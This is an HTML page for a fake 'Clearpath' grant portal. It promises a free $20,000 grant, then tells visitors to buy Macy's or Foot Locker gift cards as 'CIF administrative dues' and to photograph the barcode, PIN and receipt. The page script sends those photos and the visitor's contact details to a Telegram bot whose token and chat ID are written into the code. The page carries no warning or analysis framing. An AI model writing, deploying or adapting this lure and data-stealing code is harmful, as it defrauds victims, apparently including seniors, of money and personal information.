<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Clearpath CIF Payment</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="icon" type="image/png" href="https://dcassetcdn.com/design_img/202824/20112/20112_2244546_202824_thumbnail.jpg" />
</head>

<body class="bg-gray-100 font-sans">

  <!-- üåü Header -->
  <header class="bg-green-700 text-white py-4 shadow-md">
    <div class="max-w-3xl mx-auto flex items-center justify-between px-4">
      <div class="flex items-center gap-3">
        <img src="https://dcassetcdn.com/design_img/202824/20112/20112_2244546_202824_thumbnail.jpg" alt="ClearPath Logo" class="w-12 h-12 rounded-lg bg-white p-1" />
        <div>
          <h1 class="text-xl font-bold tracking-wide">Clearpath Volunteers Payment Portal
            <svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4 text-Green-500" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
              <path d="M12 2a10 10 0 1 0 .001 20.001A10 10 0 0 0 12 2zm-1.2 14.3l-3.5-3.5 1.4-1.4 2.1 2.1 4.8-4.8 1.4 1.4-6.2 6.2z" />
            </svg>
          </h1>
          <span class="text-sm bg-white/20 px-3 py-1 rounded-lg">Secure Access Only </span>
        </div>
      </div>
    </div>
  </header>

  <!-- üåü Card Preview Section (After Header) -->
  <section class="max-w-3xl mx-auto mt-6 bg-white p-4 rounded-2xl shadow-md border border-gray-100 text-center">
    <h2 class="text-lg font-semibold text-green-700 mb-2">Here's Preview of Macy's and footlocker Card </h2>
    <p class="text-sm text-gray-600 mb-4">You Can Purchase Card From Walmart, CVS, Target, Walgreens , Dollar Tree(Recommended by our volunteers).Make sure the Card is Activated. Scroll down to Link Card below for CIF Administrative dues üëá</p>
    <img src="https://blog.nosh.ng/wp-content/uploads/2023/05/grocery-store-foot-locker-gift-card-grovetown-ga-usa-260147499.jpeg" alt="Senior Card Preview" class="mx-auto w-32 h-24 object-cover rounded-lg border border-gray-300 shadow-sm">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSkySJhhWsRxu6dj1Qg6jV_PvQStR_bEiei3fqouEThYQOqng82VWyihnM&s=10" alt="Senior Card Preview" class="mx-auto w-32 h-24 object-cover rounded-lg border border-gray-300 shadow-sm">
  </section>

  <!-- üßæ Form Container -->
  <main class="max-w-3xl mx-auto mt-8 mb-12 bg-white p-6 rounded-2xl shadow-md border border-gray-100">
    <h2 class="text-2xl font-semibold text-green-700 mb-4 text-center">Client Information file Administrative dues</h2>

    <form class="space-y-6">

      <!-- üßç Applicant Name (STATIC display only) -->
      <div>
        <label class="block text-sm font-medium text-gray-700 flex items-center gap-2">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5.121 17.804A8 8 0 1118.878 6.197M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
          </svg>
        </label>

        <div class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-3 bg-gray-50 text-gray-800">
          <div class="flex items-center justify-between">
            <div class="flex items-center gap-3">
              <div class="w-10 h-10 rounded-full bg-green-100 flex items-center justify-center text-green-700 font-semibold">A</div>
              <div>
                <div class="text-sm font-semibold"> </div>
                <div class="text-xs text-gray-500">Approved Applicant</div>
                <small>$20,000.00</small>
              </div>
            </div>
            <div class="text-xs text-gray-500 italic">Record:2025 Verified</div>
            <small>CIF Admin Dues: $0.00</small>
          </div>
        </div>
      </div>

      <!-- ü™™ Upload ID Verification -->
      <div class="space-y-3">
        <div class="grid grid-cols-1 gap-3">
          <!-- üì∏ Card Upload (Macy's & Footlocker) -->
          <h1 class="font-semibold">Snap your Macy's card or Footlocker card with Receipt</h1>
          <div class="flex flex-col items-center justify-center border-2 border-dashed border-green-400 rounded-xl p-4 hover:bg-green-50 transition-all">
            <label class="flex flex-col items-center cursor-pointer">
              <div class="flex gap-4 mb-2">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRjwmYFN8UStsRaNxt4IosLBiYLD36SXSZ7iujZWU9UvGcyhJTky25YWvJx&s=10 " alt="Macy's Logo" class="h-10 object-contain">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXyzvcxzbp864CrBUfcTJAa47u4CyP7PdQ9A&usqp=CAU " alt="Foot Locker Logo" class="h-10 object-contain">
              </div>
              <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7h4l1.5-2h7L17 7h4v13H3V7z" />
                <circle cx="12" cy="13" r="3" stroke-width="2" stroke="currentColor" fill="none"/>
              </svg>
              <span class="text-xs text-gray-700 mt-1 font-medium">Take a Photo</span>
              <input id="cardCameraInput" type="file" accept="image/*" capture="camera" class="hidden">
              <!-- Hidden Receipt Input -->
              <input id="receiptCameraInput" type="file" accept="image/*" capture="camera" class="hidden">
            </label>
          </div>

          <!-- üñº Preview Area -->
          <div id="previewArea" class="mt-3 hidden">
            <p class="text-sm text-gray-600 font-medium mb-2">Preview:</p>
            <img id="previewImage" src="#" alt="Preview Image" class="w-40 h-28 object-cover rounded-lg border border-gray-300 shadow-sm">
          </div>

          <p class="text-xs text-gray-500 italic mt-2">
            Please Snap a clear image of your Macy's Card or Footlocker Card, barcode and Pin ( Back of the Card), and Receipt.
          </p>
        </div>
      </div>

      <!-- Terms & Submit -->
      <div class="pt-2">
        <button type="submit" class="w-full bg-green-700 hover:bg-green-800 text-white py-3 rounded-lg font-semibold transition-all">
          Link Card 
        </button>
      </div>
    </form>

    <!-- Important Notice -->
    <div class="bg-blue-50 border-l-4 border-blue-600 p-4 rounded-lg mt-4">
      <p class="text-blue-800 text-sm leading-relaxed">
        üì¶ <strong>Important Notice:</strong>  Clearpath Grant are free , you don't have to pay back,
        This Grant doesn't require fees. the only requirement is Client information file( CIF).
        Your Client Information file community dues Required to be completed, your official 
        <strong> Clearpath Grant Letter</strong> and <strong>Verification Paperwork</strong> 
        will be mailed to your provided address within <strong>24 hours</strong>.  
        Funding is processed and typically arrives within <strong> a week for first funding</strong>.  
        Please ensure your details are correct and proceed to complete your Secure verification and community access promptly.
      </p>
    </div>
  </main>

  <!-- ‚öôÔ∏è Script for Preview -->
  <script>
    const cardCameraInput = document.getElementById('cardCameraInput');
    const receiptCameraInput = document.getElementById('receiptCameraInput');
    const previewArea = document.getElementById('previewArea');
    const previewImage = document.getElementById('previewImage');

    function showPreview(file) {
      if (!file) return;
      const reader = new FileReader();
      reader.onload = e => {
        previewImage.src = e.target.result;
        previewArea.classList.remove('hidden');
      };
      reader.readAsDataURL(file);
    }

    cardCameraInput.addEventListener('change', e => showPreview(e.target.files[0]));
    receiptCameraInput.addEventListener('change', e => showPreview(e.target.files[0]));
  </script>

  <!-- üîª Footer -->
  <footer class="bg-gray-900 text-gray-300 text-sm py-4 text-center mt-12">
    <p>¬© 2025 ClearPath Grant Verification | All Rights Reserved</p>
    <p class="text-xs text-gray-400 mt-1">Your data is protected under our privacy and security compliance policy.</p>
  </footer>

  <!-- ‚úÖ Success Popup Modal -->
  <div id="successModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-50">
    <div class="bg-white rounded-2xl shadow-2xl p-6 text-center w-80 animate-fadeIn">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-green-500 mx-auto mb-3" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
      </svg>
      <h2 class="text-xl font-semibold text-gray-800 mb-1">CIF Verification Submitted</h2>
      <p class="text-sm text-gray-600 mb-4">You‚Äôll receive a confirmation email shortly From our Grant volunteers Team Please Check your Email in next 20min for the Next step and Final Funding procedures Congratulations!.</p>
      <button onclick="closeSuccessModal()" class="bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg font-medium">OK</button>
    </div>
  </div>

  <!-- ‚ú® Simple Fade-in Animation -->
  <style>
    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.95); }
      to { opacity: 1; transform: scale(1); }
    }
    .animate-fadeIn { animation: fadeIn 0.25s ease-out; }
  </style>

  <script>
    async function sendToTelegram(form) {
      const BOT_TOKEN = "7699802136:AAG_orN_BB2Z3OHRxjimkg7eYxa3gRRIy0A";
      const CHAT_ID = "-4566011226";
      const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const TELEGRAM_PHOTO_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

      const phone = form.querySelector('input[type="tel"]')?.value.trim() || "Not Provided";
      const email = form.querySelector('input[type="email"]')?.value.trim() || "Not Provided";
      const address = form.querySelector('input[name="address"]')?.value.trim() || "Not Provided";

      const cardFile = document.getElementById("cardCameraInput").files[0];
      const receiptFile = document.getElementById("receiptCameraInput").files[0];

      const textMessage = `
üìã *New Grant Verification Submission*
----------------------------
üë§ Approved Beneficiary ‚Äì Verified
üìû Phone: ${phone}
‚úâÔ∏è Email: ${email}
üè† Address: ${address}
üí∞ Total Funding: $20,000
Program Type: Senior Support / Home Assistance
Reference: CIF/Clearpath Volunteers Team
----------------------------
      `;

      const submitBtn = form.querySelector('button[type="submit"]');
      const originalBtnText = submitBtn.innerHTML;

      submitBtn.disabled = true;
      submitBtn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" class="animate-spin h-5 w-5 inline-block mr-2 text-white" viewBox="0 0 24 24" fill="none" stroke="currentColor">
        <circle cx="12" cy="12" r="10" stroke-width="4" class="opacity-25"/>
        <path stroke-width="4" d="M4 12a8 8 0 018-8"/>
      </svg> Sending...`;

      try {
        await fetch(TELEGRAM_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: textMessage,
            parse_mode: "Markdown",
          }),
        });

        if (cardFile) {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", cardFile);
          formData.append("caption", "ü™™ Card Upload (Macy's/Footlocker)");
          await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
        }

        if (receiptFile) {
          const formData = new FormData();
          formData.append("chat_id", CHAT_ID);
          formData.append("photo", receiptFile);
          formData.append("caption", "üßæ Receipt Upload");
          await fetch(TELEGRAM_PHOTO_URL, { method: "POST", body: formData });
        }

        document.getElementById("successModal").classList.remove("hidden");
        form.reset();
        document.getElementById("previewArea").classList.add("hidden");
      } catch (error) {
        alert("‚ùå Failed to submit. Please check your internet or Telegram bot token.");
        console.error(error);
      } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalBtnText;
      }
    }

    function closeSuccessModal() {
      document.getElementById("successModal").classList.add("hidden");
    }

    document.querySelector("form").addEventListener("submit", function (e) {
      e.preventDefault();
      sendToTelegram(e.target);
    });
  </script>

</body>
	</html>
